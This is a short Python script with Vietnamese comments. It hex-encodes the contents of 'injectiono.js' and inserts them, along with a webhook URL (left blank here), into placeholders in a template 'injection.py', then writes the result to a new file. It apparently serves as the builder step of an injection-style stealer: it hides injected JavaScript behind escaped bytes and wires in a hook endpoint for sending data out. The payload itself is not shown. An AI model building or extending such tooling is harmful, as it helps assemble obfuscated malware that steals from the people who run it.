def string_to_hex(content):
    contentt = ''.join(f'\\x{c:02x}' for c in content)
    return contentt.encode('utf-8')

with open('injectiono.js', 'rb') as file:
    content = file.read()

with open('injection.py', 'rb') as file:
    contentinj = file.read()

hex_content = string_to_hex(content)
hook_url = " "

contentinj = contentinj.replace(b"%code%", hex_content).replace(b"%hookurl%", hook_url.encode('utf-8'))

# Ghi nội dung đã thay thế vào tệp mới
with open('injection-o.py', 'wb') as output_file:
    output_file.write(contentinj)

print("Nội dung đã được ghi vào tệp injection-o.py")
